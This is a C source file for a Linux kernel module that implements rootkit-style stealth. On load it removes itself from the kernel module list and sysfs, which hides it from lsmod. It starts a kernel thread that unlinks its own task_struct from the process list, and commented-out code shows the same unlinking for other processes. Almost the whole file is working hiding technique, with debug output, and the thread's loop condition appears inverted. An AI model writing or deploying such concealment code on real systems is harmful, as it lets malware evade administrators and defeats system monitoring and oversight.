#include <asm/uaccess.h>
#include <linux/delay.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/list.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/unistd.h>

MODULE_LICENSE("GPL");

//	method 1:
//	Adds a function to use kthread_create_list into kernel code.
//	This method can't get into loop. -> Doesn't work.
//	kthread_create_list will be created in kthread_create_on_node and 
//	deleted in kthreadd, which means a running kthread will not be
//	contained in kthread_create_list because it is created.
//	do {
//		all_kthread_name();
//		msleep_interruptible(1000*60);
//	} while (1);

//	method 2:
//	Uses the same way as following part. Just executes this process earlier
//	and delete what I don't want to see.
//	for_each_process(tsk) {
//		if (tsk->comm == cur->task->comm) {
//			(tsk->tasks.prev)->next = tsk->tasks.next;
//			(tsk->tasks.next)->prev = tsk->tasks.prev;
//		}
//	}

static int kthread_func(void *data) {
	printk(KERN_INFO "I'm in kthread_func.\n");
	
	struct thread_info *cur = current_thread_info();
	struct task_struct *tsk;
	
//	method 3:
//	Uses current_thread_info. I found this when searching for current.
	printk(KERN_INFO "Get current thread name: %s\n", cur->task->comm);
	(cur->task->tasks.prev)->next = cur->task->tasks.next;
	(cur->task->tasks.next)->prev = cur->task->tasks.prev;

	do {	
		for_each_process(tsk) {
			if (tsk->parent->pid == 2)
				printk(KERN_INFO "kthread_func prints all process name: %s\n", tsk->comm);
		}
		msleep_interruptible(1000*60);
	} while (kthread_should_stop()); 
	return 0;
}

static int hide_thread_init(void) {
	printk(KERN_INFO "Hide my module from lsmod.");
	list_del_init(&THIS_MODULE->list);
	printk(KERN_INFO "Hide my module from sysfs.");
#ifdef CONFIG_SYSFS
	kobject_del(&THIS_MODULE->mkobj.kobj);
#endif
	printk(KERN_INFO "Start kthread_func.");
	struct task_struct *tsk = kthread_run(kthread_func, NULL, "my_kthread");
	if (IS_ERR(tsk)) 
		printk(KERN_INFO "create kthread failed!\n");
	else 
		printk(KERN_INFO "create kthread ok!\n");
	printk(KERN_INFO "Finish to start kthread_func.");

	return 0;
}
static void hide_thread_cleanup(void)
{
}

module_init(hide_thread_init);
module_exit(hide_thread_cleanup);
